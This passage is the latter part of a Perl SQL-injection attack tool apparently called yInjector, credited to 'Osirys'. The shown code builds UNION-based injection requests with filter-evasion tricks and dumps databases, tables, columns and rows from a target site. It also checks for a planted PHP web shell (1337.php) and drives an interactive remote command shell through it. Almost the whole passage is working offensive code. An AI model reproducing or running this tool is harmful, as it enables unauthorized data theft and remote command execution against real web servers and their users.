						if ($p =~ /\/$/) {
							$sr = $p."1337.php";
						}
						else {
							$sr = $p."/1337.php";
						}
						my $test = req($sr,"");
						if ($test =~ /st4rt/) {
							$sherr = 0;
							yprint("    [*] Shell succesfully injected !\n".
								  "    [&] Hi my master, do your job now [!]\n\n");
							&exec_cmd($sr);
						}
						else {
							yprint("    [-] Shell not found !\n    [-] Command Execution Failed !\n\n");
						}
					}
				}
			}
               elsif ($choose =~ /help|h/) {
                    if ($info_schema == 1) {
                         if ($info_schema_other_dbs == 1) {
                              $help = "\n[+] help()\n".
                                         "    l - Gets the list of all databases\n".
                                         "    1 - Extracts all tables  from user selected db\n".
                                         "    2 - Extracts all columns from user selected db\n".
                                         "    3 - Extracts all columns of a selected table from user selected db\n".
                                         "    4 - Extracts user selected columns of a selected table from user selected db\n".
                                         "    5 - Crack your md5 Hash\n".
                                         "    6 - MYSQL CMD line, type your own query (Advanced Beta)\n".
                                         "    7 - Command Execution (MQ Off+LoadFile ON+Apache Poisoning)\n".
                                         "    h - Help\n".
                                         "    e - Exit\n";
                         }
                         else {
                              $help = "\n[+] help()\n".
                                         "    1 - Extracts all tables  from current DB ($database_name)\n".
                                         "    2 - Extracts all columns from current DB ($database_name)\n".
                                         "    3 - Extracts all columns of a selected table from current DB ($database_name)\n".
                                         "    4 - Extracts user selected columns of a selected table from current DB ($database_name)\n".
                                         "    5 - Crack your md5 Hash\n".
                                         "    6 - MYSQL CMD line, type your own query (Advanced Beta)\n".
                                         "    7 - Command Execution (MQ Off+LoadFile ON+Apache Poisoning)\n".
                                         "    h - Help\n".
                                         "    e - Exit\n";
                         }
                         yprint($help,2);
                    }
                    elsif ($info_schema == 0) {
					$help = "\n[+] help()\n".
						   "    x - [1-4] Table Schema Bruteforce will be avaiable in the next release\n".
                                 "    5 - Crack your md5 Hash\n".
                                 "    6 - MYSQL CMD line, type your own query (Advanced Beta)\n".
                                 "    7 - Command Execution (MQ Off+LoadFile ON+Apache Poisoning)\n".
                                 "    h - Help\n".
                                 "    e - Exit\n";
					yprint($help,2);
                    }
               }
               elsif ($choose =~ /^e|exit|quit$/) {
                    print "\n[-] Quitting ..\n\n";
                    exit(0);
               }
          }
          else {
               print "\n[-] Bad choise !\n";
          }
     }
}

sub yprintr() {
	my $var = $_[0];
	my $print;
	if ($first == 1) {
		$lengpv = length($var);
		print "\r$var";
		$first = 0;
	}
	else {
		my $t = length($var);
		my $diff = $lengpv - $t;
		if ($diff < 0) {
			$diff = 0;
			$print = $var;
		}
		else {
			my($str,$str1) = ("","");
			for ($i = 0;$i < $diff;$i++) {
				$str .= " ";
				$str1 .= "\b";
			}
			$print = $var;
			$print =~ s/(.+)/$1$str$str1/;
		}
		print "\r$print";
		$lengpv = length($var);
	}
}

sub exec_cmd() {
	my $sr = $_[0];
	my $h = $h0st;
	$h !~ /www\./ || $h =~ s/www\.//;
	print "shell[$h]\$> ";
	$cmd = <STDIN>;
	if ($cmd =~ /exit/) {
		return;
	}
	my $re = req($sr."?cmd=".$cmd,"Fst4rt");

	$re =~ s/ /\$/g;
	$re =~ s/\s/\*/g;

	if ($re =~ /st4rtI(.+)Fst4rt/) {
		my $out = $1;
		$out =~ s/\$/ /g;
		$out =~ s/\*/\n    /g;
		$out =~ s/    $/\n/;
		chomp($out);
		yprint("    $out");
		&exec_cmd($sr);
	}
	else {
		$sherr++;
		$cmd =~ s/\n//;
		yprint("bash: ".$cmd.": command not found\n");
		if ($sherr >= 3) {
			$sherr = 1;
			yprint("\n[-] Commands are not executed, unknown error. FAIL !\n\n");
			return;
		}
		&exec_cmd($sr);
	}
}

sub own() {
     my($kind_s,$pack,$l,$rows,$arr) = @_;
     my($stop,$no) = (0,1);
     my(@data,$ff);
     if ($kind_s =~ /tables/) {
          $name = "Table";
     }
     elsif ($kind_s =~ /columns/) {
          $name = "Column";
     }
     elsif ($kind_s =~ /sql_compl/) {
          $name = "Data";
     }
     if ($l == 1) {
          $lim_1 = 17;
     }
     else {
          $lim_1 = 0;
     }
     my $count = 0;
     my $mx = $rows;$mx = $mx +5;
     while (($lim_1 <= $mx)&&($stop != 1)) {
          if (($lim_1 % 1 == 0)||($lim_1 == 0)) {
               my $tmp_pack = $pack;
               if ($pack_end =~ /.+/) {
                    $tmp_pack =~ s/limit $pack_end/limit $lim_1,$lim_2$pack_end/;
               }
               else {
                    $tmp_pack =~ s/limit /limit $lim_1,$lim_2/;
			}
               my $re = req($tmp_pack,"\{ownedE\}");
               if ($re =~ m/\{owned\}([^{]+)\{ownedE\}/gi) {
                    if ($arr == 1) {
                         push(@dbs, $1);
                    }
				if ($arr == 2) {
					push(@dbs_2, $1);
				}
                    $count++;
                    yprint("    [$name][$count/$rows] : [$1]\n");
                    $ff = 1;
               }
               else {
                    $no++;
               }
               if ($no >= 4) {
                    $stop = 1;
               }
          }
          $lim_1++;
     }
     return($ff);
}

sub count_rows() {
     my($table,$oth,$extra) = @_;
     my($numrows,$inj,$v);
	if ($extra == 0) {
		$v = "count(*)";
	}
	else {
		$v = "count(".$extra.")";
	}

     if (($oth != 0)||(length($oth) > 2)) {
          $inj = &get_sql_inj($v, $table, $oth, 0);
     }
     else {
          $inj = &get_sql_inj($v, $table, 0, 0);
     }
     my $re = req($inj,"\{ownedE\}");
     if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
          $numrows = $1;
          yprint("\n[+] Found $numrows rows .\n");
     }
     else {
          yprint("\n[-] Unable to count the number of rows of the selected element .\n");
     }
     return($numrows);
}

sub info_schema_nomysqlver_test() {
	my $ok = 0;
	# SELECT table_name FROM information_schema.tables LIMIT 0 , 1
	my $inj = &get_sql_inj("table_name", "information_schema.tables", 0, 0);
	my $re  = req($inj,"\{ownedE\}");
	if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
		my $row = $1;
		if ($row =~ /CHARACTER_SETS|COLLATIONS|COLLATION_CHARACTER_SET_APPLICABILITY|COLUMNS/i) {
			$ok = 1;
			yprint("[+] Well done. Even if mysql version was undefined, our test was succesfully.\n".
				  "    Information Schema table is supported. yey !\n");
		}
	}
	return($ok);
}

sub column_match() {
	my $pkg = $_[0];
    my $count = $_[1];
     my $ok;
	$hex_long_string_test = "0x414141414141414141414141414141414141414141414141".
						  "7468697369736174657374666f72616c6f6e67737472696e67".
						  "746f62657072696e746564746f636865636b69667468657265".
						  "6973656e6f7567687370616365746f736565726f7773414141".
						  "414141414141414141414141414141414141414141";
	# 121 chars
	$long_string_test =     "AAAAAAAAAAAAAAAAAAAAAAAAthisisatestforalongstringto".
						  "beprintedtocheckifthereisenoughspacetoseerowsAAAAAAA".
						  "AAAAAAAAAAAAAAAAA";

     print "[+] Injecting $count/$max ..\n";
     my $re = req($pkg,$match);
     if ($matchk == 1) {
          if ($re =~ /$match/g) {
               $ok = 1;
          }
          else {
               $ok = 0;
          }
     }
     elsif ($matchk == 2) {
          if ($re !~ /$match/g) {
               $ok = 1;
          }
          else {
               $ok = 0;
          }
     }
     if ($ok == 1) {
          yprint("\n[*] Number of Columns: $count\n".
                  "[+] Testing now for the printed column ..\n");
          my $st = 1;
          my $col;
          my $str;
          my @arr;
		my $rand_n;
		my $col_numb;
          while ($st <= $count) {
               my $h = hex_conv(":_".$st."_:");
               $str .= $h.",";
               $st++;
          }
          $str =~ s/,$//;
          $sssite = $pkg;
          $pkg =~ s/(\/\*\*\/|select )[0-9,]+/$1$str/;
		if ($bypass == 1) {
			$sssite =~ s/(.+)(uNiOn|union)(.+)/$1aNd\/**\/1=2\/**\/$2$3/;
			$pkg =~ s/(.+)(uNiOn|union)(.+)/$1aNd\/**\/1=2\/**\/$2$3/;
		}
		else {
			$sssite =~ s/(.+)(uNiOn|union)(.+)/$1and 1=2 $2$3/;
			$pkg =~ s/(.+)(uNiOn|union)(.+)/$1and 1=2 $2$3/;
		}
		my $re = req($pkg,":_([0-9]+)_:");
        if ($re =~ /:_([0-9]+)_:/) {
               $cff = 1;
			my $col_st;
			my @printed_col;
			while ($re =~ /:_([0-9]+)_:/g) {
				my $p = $1;
				$col_st .= $p.", ";
				push(@printed_col, $p);
			}
			
			if (length($col_st) < 0) {
				yprint("\n[-] Unable to find a printed column .. Possible Blind SQL Injection !\n\n");
				exit(0);
			}
			else {
				$col_st =~ s/, $//;
			}

               $col = $1;
               yprint("[*] Printed column(s): $col_st\n".
				  "    Testing now the column that more fits out needs.\n");
			my $stp = 0;
			my @tmp_vars_col_tests;
			my $c_count = 0;
			if (scalar(@printed_col) > 1) {
				my $c_count = 0;
				while ((my $c = <@printed_col>)&&($stp != 1)) {
					$c_count++;
					$stp = try_column($c,$c_count);
				}
				if ($stp == 0) {
					yprint("[-] None columns passed the match/full info retrieving test\n");
				}
			}
			else {
				$c_count = 0;
#				# only one column prints rows, if this one does not prints
#			# rows correctly, all dumping process might be compromised
				$stp = try_column($printed_col[0],1);
				if ($stp == 0) {
					# the only one column that prints rows prints them
					# not correctly, dumping might be compromised
					yprint("[!] There is only one column that prints rows: ".$printed_col[0]."\n".
						  "    This column did not pass the match/full info retrieving test\n");
				}
			}
			if ($stp == 0) {
				yprint("    after having tried to make the sql injection to display a 121\n".
					  "    char string as a test. Dumping process might be compromised.\n".
					  "    yInjector did not match in the HTML response the following string test:\n".
					  "    {owned}$long_string_test{ownedE}\n".
					  "    Press 1 if you want to proceed anyway, 0 if not (exit)\n    Choise: ");
				chomp(my $choice = <STDIN>);
				my $no = 0;
				if ($choice == 0) {
					print "\n[-] Quitting ..\n\n";
					exit(0);
				}
				$rand_n = rand(scalar(@printed_col));
				$col_numb = $rand_n;
			}
			else {
				$col_numb = $c_count;
				yprint("[+] This column passed the 121 chars string test: ".$printed_col[$col_numb]."\n\n");
			}

			# printed column is : $printed_col[$c_count]
			my $col = $printed_col[$c_count];
			if ($col == 1) {
				$sssite =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select)([^,]*)($col{1}),/$1$2:print:,/;
			}
			elsif ($col == $count) {
				$sssite =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select)(.+),($col{1})/$1$2,:print:/;
			}
			else {
				$sssite =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select)(.+),($col{1}),(.+)/$1$2,:print:,$4/;
			}

               $pkg =~ s/.+/$sssite/;
               if ($start_kind_ == 3) {
                    if (length($een) >= 1) {
                         $pkg =~ s/$een/:STOP:$een/;
                    }
                    else {
                         $pkg =~ s/(.+)/$1:STOP:/;
                    }
                    $site = $pkg;
               }

               if ($start_kind_ != 3) {
                    my $chhv = $pkg;
                    $chhv =~ s/:print:/\@\@version/;
                    if ($treq_ == 1) {
                         my $chhv = $pkg;
                         $chhv =~ s/:print:/\@\@version/;
                         yprint("[+] GET Packet :\n".
                                 "    GET ".encode("http://".$h0st.$chhv)." HTTP/1.1\n".
                                 "    Host: ".$h0st."\n\n");

                    }
                    elsif ($treq_ == 2) {
                         yprint("[+] POST Packet :\n".
                                 "    POST ".$path." HTTP/1.1\n".
                                 "    Host: ".$h0st."\n".
                                 "    User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2\n".
                                 "    Keep-Alive: 300\n".
                                 "    Connection: keep-alive\n".
                                 "    Content-Type: application/x-www-form-urlencoded\n".
                                 "    Content-Length: ".length($chhv)."\n\n".
                                 "    ".$chhv."\n\n");
                    }
               }
          }
          else {
               yprint("\n[-] Unable to find a printed column .. Possible Blind SQL Injection !\n\n");
               exit(0);
          }
     }
     return($ok);
}
sub try_column() {
	my($col,$count) = ($_[0],$_[1]);
	my $ok = 0;
	my $copy_ss;
	# backup of global scripts vars to restore them during the while cicle

	if ($count == 1) {
		@tmp_vars_col_tests;#print "primo giro\n$sssite messo in array\n";
		push(@tmp_vars_col_tests,$sssite,$site);#print "testiamo.. ".$tmp_vars_col_tests[0]."\n";
		$copy_ss = $sssite;
	}
	else {#print "siam al secondo giro\n";
		$copy_ss = $tmp_vars_col_tests[0];
	}
	#print "sssite A: $copy_ss\n";
	if ($col == 1) {
		$copy_ss =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select)([^,]*)($col{1}),/$1$2:print:,/;
	}
	elsif ($col == $count) {
		$copy_ss =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select)(.+),($col{1})/$1$2,:print:/;
	}
	else {
		$copy_ss =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select)(.+),($col{1}),(.+)/$1$2,:print:,$4/;
	}
	#print "sssite B: $copy_ss\n";
	$copy_ss  =~ s/:print:/concat(0x7b6f776e65647d,$hex_long_string_test,0x7b6f776e6564457d)/;

	my $re = req($copy_ss,"\{ownedE\}");
	if ($re =~ /\{owned\}$long_string_test\{ownedE\}/i) {
		# the columns prints 121 total chars, works good then !
		$ok = 1;
	}
	else {
		# the column does not print good enough rows, could cause problem in
		# terms of matching or full informations retrieving, must try the next
		$ok = 0;
	}
	return($ok);
}
sub get_sql_inj() {
     my($select_,$from_,$where_,$limit_,$oth_shit) = @_;
	my $inj,$tpie;
     if ($from_ !~ /.{2,80}/) {
          $from = "";
     }
     else {
          $from = " from ".$from_;
     }
     if ($where_ !~ /.{2,80}/) {
          $where = "";
     }
     else {
          $where = " where ".$where_;
     }
     if ($limit_ == 0) {
          $limit = "";
     }
     else {
          $limit = " limit ";
     }
     #$select_ =~ s/ /,0x3a,/g;

	$t_f = $first_sel;
	$t_s = $second_sel;

	if ((length($oth_shit) > 1)||($oth_shit == 1)) {
		$t_f =~ s/concat\(0x7b6f776e65647d,//;
		$t_s =~ s/,0x7b6f776e6564457d\)//;
		if ($oth_shit == 1) {
			$oth_shit =~ s/.+//;
		}
		else {
			$oth_shit =~ s/(.+)/ $1/;
		}
	}

	if ($bypass == 1) {
		$inj = $pack_st.$t_f.$select_.$t_s.$from.$where.$limit.$oth_shit.$pack_end;
		$inj =~ s/ into dumpfile /\/**\/InTo\/**\/DuMpFiLe\/**\//; 
		$inj =~ s/concat/cOnCAt/;
		$inj =~ s/ from /\/**\/FrOm\/**\//;
		$inj =~ s/ limit /\/**\/lImIT\/**\//;
	}
	else {
		$inj = $pack_st." ".$t_f.$select_.$t_s.$from.$where.$limit.$oth_shit.$pack_end;
	}
     return($inj);
}

sub config() {
     my($pack,$j) = ($_[0],$_[1]);
	my $c = 0;
     if ($j == 1) {
          $time = time();
          $lim_2 = 1;
          $stop  = 0;
          $no    = 0;
          $max   = 10000;
     }
     $pack  =~ s/:print:/concat(0x7b6f776e65647d,:print:,0x7b6f776e6564457d)/;

	if ($bypass == 1) {
		if ($pack =~ /(.+)uNiOn(.+):STOP:(.*)/) {
			$c = 1;
			$pack_st = $1;
			$injection = "uNiOn".$2;
			$pack_end = $3;
		}
	}
	else {
		if ($pack =~ /(.+) union (.+):STOP:(.*)/) {
			$c = 1;
			$pack_st = $1;
			$injection = "union ".$2;
			$pack_end = $3;
		}
	}

	if ($c == 1) {
          if ($injection =~ /(.+):print:(.*)/) {
               ($first_sel,$second_sel) = ($1,$2);
          }
     }
}

sub yprint() {
     my($msg,$opt) = @_;
     if ($opt == 1) {
		if ($file_st == 1) {
			print FILE $msg || die "\n[-] Unable to write on Log file -> $log_opt_\n\n";
		}
     }
	elsif ($opt == 2) {
		print $msg;
	}
     else {
          print $msg;
		if ($file_st == 1) {
			print FILE $msg;
		}
     }
}

sub hex_conv() {
     my($string,@tmp,$hex) = ($_[0],undef,undef);
     @tmp = unpack('C*', $string);
     foreach my $c(@tmp) {
          $hex .= sprintf("%lx", $c);
     }
     $hex =~ s/.*/0x$hex/;
     return($hex);
}

sub get_input() {
     my($host,$reqq) = @_;
     $host =~ /http:\/\/(.+)/;
     $s_host = $1;

	#if ($s_host =~ //)

     if ($reqq == 1) {
          $s_host =~ /([0-9:a-z.-]{1,40})\/(.*)/;
          ($h0st,$path) = ($1,$2);
		if ($h0st =~ /:([0-9]+)/) {
			$port_ = $1;
		}


          $path =~ s/(.*)/\/$1/;
     }
     elsif ($reqq == 2) {
          $s_host=~ /([0-9:a-z.-]{1,40})(.+)\.([a-z0-9]{2,4})/;
          ($h0st,$path) = ($1,$2.".".$3);
		if ($h0st =~ /:([0-9]+)/) {
			$port_ = $1;
		}
          if ($path =~ /^([^\/])/) {
			$path =~ s/(.+)/\/$1/;
		}
     }
}

sub req() {
     my($pack,$regexp,$otopt) = ($_[0],$_[1],$_[2]);
     my($stop,$data,$string,@tmp_src,$text);
	my($add_,$h0st_,$path_,$oth_req,$way,$port_);
	if (length($otopt) > 1) {
		$oth_req = 1;
		$otopt =~ /([^|]+)\|\|([^|]+)\|\|([^|]+)\|\|(.*)/;
		($way,$addr_,$h0st_,$path_,$port_) = ($1,$2,$3,$4,'80');
	}
	else {
		$add_ = $addr;
		$h0st_ = $h0st;
		$path_ = $path;
	}

	if ($oth_req != 1) {
		if ($proxy != 0) {
			$addr_ = $proxy;
			$port_ = $pport;
		}
		else {
			$addr_ = $h0st;
			if (length($port_) < 1) {
				$port_ = '80';
			}
			
		}
		if ($treq_ == 1) {
			$req_t = 1;
		}
		elsif ($treq_ == 2) {
			$req_t = 2;
		}
	}
	else {
		if ($way eq 'get') {
			$req_t = 1;
		}
		elsif ($way eq 'post') {
			$req_t = 2;
		}
	}
     my $socket   =  new IO::Socket::INET(
                                             PeerAddr => $addr_,
                                             PeerPort => $port_,
                                             Proto    => 'tcp',
                                             Timeout  => 5
                                          ) or die $!."\n";
     if ($bypass == 1) {
          #$pack =~ s/ /\/**\//g;
     }

	#print "\t$pack\n";
	$pack = encode($pack);
	if ($req_t == 1) {
		#print "# $pack\n";
          $data = "GET ".$pack." HTTP/1.1\r\n".
                  "Host: ".$h0st_."\r\n".
                  "Connection: close\r\n\r\n";
	}
	else {
          my $length = length($pack);
		$data = "POST ".$path_." HTTP/1.1\r\n".
			   "Host: ".$h0st_."\r\n".
			   "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2\r\n".
			   "Connection: close\r\n".
			   "Content-Type: application/x-www-form-urlencoded\r\n".
			   "Content-Length: ".$length."\r\n\r\n".
			   $pack."\r\n\r\n";
	}
	#print $data."\n";
     $socket->send($data);
     while ((my $e = <$socket>)&&($stop != 1)) {
          if ($e !~ /^0\r\n$/) {
               push(@tmp_src,$e);
               if ($e =~ /$regexp/i) {
                    $stop = 1;
               }
          }
          #$socket->blocking(0);
     }
     foreach my $e(@tmp_src) {
          $string .= $e;
     }
     return($string);
}

sub in_array() {
    my($l,@arr) = @_;
    my $found = 0;
    foreach my $e(@arr) {
        if ($found == 0) {
            if ($e eq $l) {
                $found = 1;
            }
        }
    }
    return $found;
}

sub encode() {
     my $str = $_[0];
     $str =~ s/ /%20/g;
     $str =~ s/'/%27/g;
     $str =~ s/!/%21/g;
     return($str);
}

# Code ends here
# Credits to Giovanni Buzzin, "Osirys"